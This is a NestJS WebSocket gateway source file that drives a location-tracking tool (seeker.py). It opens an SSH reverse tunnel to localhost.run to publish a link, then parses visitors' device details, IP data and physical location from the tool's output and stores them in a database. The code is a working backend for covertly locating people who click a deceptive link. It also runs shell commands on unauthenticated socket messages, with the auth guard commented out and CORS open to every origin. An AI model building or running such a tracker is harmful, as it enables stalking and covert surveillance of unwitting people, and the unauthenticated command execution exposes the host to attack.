import { ApiTags } from '@nestjs/swagger';
import { InjectRepository } from '@nestjs/typeorm';
import {
  WebSocketGateway,
  WebSocketServer,
  OnGatewayInit,
  OnGatewayConnection,
  OnGatewayDisconnect,
  SubscribeMessage,
  MessageBody,
  //   UseGuards,
} from '@nestjs/websockets';
import { spawn } from 'child_process';
import { Server, Socket } from 'socket.io';
// import { JwtAuthGuard } from 'src/auth/guards/jwt-auth.guard';

import { v4 as uuidv4 } from 'uuid'; // Para generar IDs únicos
import { Trackers } from './entities/tracker.entity';
import { Repository } from 'typeorm';

@ApiTags('trackers')
@WebSocketGateway({
  namespace: 'ws',
  cors: {
    origin: '*',
  },
})
export class TrackersGateway
  implements OnGatewayInit, OnGatewayConnection, OnGatewayDisconnect
{
  constructor(
    @InjectRepository(Trackers)
    private readonly trackersRepository: Repository<Trackers>,
  ) {}

  @WebSocketServer() server: Server;

  private runningProcesses = new Map<
    string,
    { process: any; socketId: string }
  >();

  public trackerId?: number;

  afterInit(server: Server) {
    console.log('Soy el server:', server);
    console.log('WebSocket server initialized');
  }

  handleConnection(client: Socket) {
    console.log('Client connected:', client.id);
    client.emit('message', 'Conexión exitosa, Código:');
    client.emit('message', client.id);
  }

  handleDisconnect(client: Socket) {
    console.log('Client disconnected:', client.id);
    client.emit('message', 'Cliente Desconectado');
  }

  @SubscribeMessage('runTracker')
  handleRunTracker(
    @MessageBody()
    {
      option,
      socketId,
      trackerId,
    }: {
      option: string;
      socketId: string;
      trackerId: string;
    },
  ): void {
    this.trackerId = +trackerId;
    const logMessage = (message: string) => {
      //   console.log(message); // Imprime en la consola del servidor
      this.server.to(socketId).emit('log', message); // Envía al cliente conectado
    };

    logMessage('Received runTracker event');
    logMessage('Received option: ' + option);
    logMessage('Received socket ID: ' + socketId);

    if (!option || !socketId) {
      const errorMessage = 'Option or socketId is missing';
      console.error(errorMessage);
      this.server.to(socketId).emit('error', errorMessage);
      return;
    }

    const command = 'cd /var/www/seeker && python3 seeker.py';
    logMessage('Command to be executed: ' + command);

    // Start the Python process
    const pythonProcess = spawn(command, [], { shell: true });
    const executionId = uuidv4(); // Generate a unique ID for this execution
    logMessage('Generated execution ID: ' + executionId);

    this.runningProcesses.set(executionId, {
      process: pythonProcess,
      socketId,
    });

    let output = '';
    let errorOutput = '';

    pythonProcess.stdout.on('data', async (data) => {
      output += data.toString();
      if (
        data.toString().includes('[+]') ||
        data.toString().includes('[!]') ||
        data.toString().includes('lhr.life')
      ) {
        logMessage('Python stdout data: ' + data.toString());
      }

      const trackerData: Partial<Trackers> = { id_tracker: this.trackerId };

      const deviceInfoMatch = data
        .toString()
        .match(/\[!\] Device Information :\s*([\s\S]*?)\n\n/);
      const ipInfoMatch = data
        .toString()
        .match(/\[!\] IP Information :\s*([\s\S]*?)\n\n/);
      const locationInfoMatch = data
        .toString()
        .match(/\[!\] Location Information :\s*([\s\S]*?)\n\n/);

      if (deviceInfoMatch) {
        console.log('info');

        const tracker = await this.trackersRepository.findOne({
          where: { id_tracker: this.trackerId },
        });
        const deviceInfo = deviceInfoMatch[1]
          .trim()
          .split('\n')
          .reduce((acc, line) => {
            const [key, value] = line.split(':').map((s) => s.trim());
            acc[key.toLowerCase().replace(/\s+/g, '_')] = value;
            return acc;
          }, {});
        console.log('INFO D', deviceInfo);

        console.log(this.trackerId);
        Object.assign(trackerData, deviceInfo);
        await this.trackersRepository.merge(tracker, trackerData);
        return await this.trackersRepository.save(tracker);
      }

      if (ipInfoMatch) {
        console.log('ip');
        const tracker = await this.trackersRepository.findOne({
          where: { id_tracker: this.trackerId },
        });
        const ipInfo = ipInfoMatch[1]
          .trim()
          .split('\n')
          .reduce((acc, line) => {
            const [key, value] = line.split(':').map((s) => s.trim());
            acc[key.toLowerCase().replace(/\s+/g, '_')] = value;
            return acc;
          }, {});

        console.log('INFO IP', ipInfo);
        console.log(this.trackerId);
        Object.assign(trackerData, ipInfo);
        this.trackersRepository.merge(tracker, trackerData);
        this.trackersRepository.save(tracker);
      }

      if (locationInfoMatch) {
        console.log('location');
        const tracker = await this.trackersRepository.findOne({
          where: { id_tracker: this.trackerId },
        });
        const locationInfo = locationInfoMatch[1]
          .trim()
          .split('\n')
          .reduce((acc, line) => {
            const [key, value] = line.split(':').map((s) => s.trim());
            acc[key.toLowerCase().replace(/\s+/g, '_')] = value;
            return acc;
          }, {});

        console.log('LOCATION INFO:', locationInfo);
        console.log(this.trackerId);
        Object.assign(trackerData, locationInfo);
        await this.trackersRepository.merge(tracker, trackerData);
        await this.trackersRepository.save(tracker);
      }
    });

    pythonProcess.stderr.on('data', (data) => {
      errorOutput += data.toString();
      logMessage('Python stderr data: ' + data.toString());
    });

    pythonProcess.stdin.write(option + '\n');
    pythonProcess.stdin.end();
    logMessage('Sent option to Python process');

    pythonProcess.on('close', (code) => {
      logMessage('Python process closed with code: ' + code);
      this.runningProcesses.delete(executionId); // Remove the record after the process closes

      if (code === 0) {
        logMessage('Python process succeeded');
        this.server
          .to(socketId)
          .emit('output', { executionId, success: true, output });
      } else {
        logMessage('Python process failed');
        this.server
          .to(socketId)
          .emit('output', { executionId, success: false, error: errorOutput });
      }
    });
  }

  @SubscribeMessage('getLink')
  handleRunTrackerLink(
    @MessageBody() { socketId }: { socketId: string },
  ): void {
    const logMessage = (message: string) => {
      //   console.log(message); // Imprime en la consola del servidor
      this.server.to(socketId).emit('log', message); // Envía al cliente conectado
    };

    const command = 'ssh -R 80:localhost:8080 nokey@localhost.run';
    logMessage('Command to be executed: ' + command);

    // Start the Python process
    const pythonProcess = spawn(command, [], { shell: true });
    const executionId = uuidv4(); // Generate a unique ID for this execution
    logMessage('Generated execution ID: ' + executionId);

    this.runningProcesses.set(executionId, {
      process: pythonProcess,
      socketId,
    });

    let output = '';
    let errorOutput = '';

    pythonProcess.stdout.on('data', (data) => {
      output += data.toString();
      if (
        data.toString().includes('[+]') ||
        data.toString().includes('[!]') ||
        data.toString().includes('lhr.life')
      ) {
        logMessage('Python stdout data: ' + data.toString());
      }
    });

    pythonProcess.stderr.on('data', (data) => {
      errorOutput += data.toString();
      logMessage('Python stderr data: ' + data.toString());
    });

    pythonProcess.on('close', (code) => {
      logMessage('Python process closed with code: ' + code);
      this.runningProcesses.delete(executionId); // Remove the record after the process closes

      if (code === 0) {
        logMessage('Python process succeeded');
        this.server
          .to(socketId)
          .emit('output', { executionId, success: true, output });
      } else {
        logMessage('Python process failed');
        this.server
          .to(socketId)
          .emit('output', { executionId, success: false, error: errorOutput });
      }
    });
  }
}
